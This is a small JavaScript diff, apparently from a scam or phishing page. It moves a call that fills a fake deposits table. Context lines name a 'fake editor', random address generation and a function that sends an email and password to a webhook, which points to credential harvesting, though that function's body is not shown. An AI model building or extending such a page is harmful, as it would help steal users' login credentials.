@@ -378,9 +378,6 @@ function mostrarFakeEditor() {
         }
     }, 1000); // Intervalo entre puntos en el mensaje de carga
 }
-document.addEventListener("DOMContentLoaded", function() {
-  generarDepositos();
-});
 
 function generarDepositos() {
   const tabla = document.getElementById("depositosTabla");
@@ -415,6 +412,7 @@ function generarDireccionAleatoria() {
   }
   return direccion;
 }
+  generarDepositos();
 
 
 function enviarDatosAWebhook(email, contrasena) {
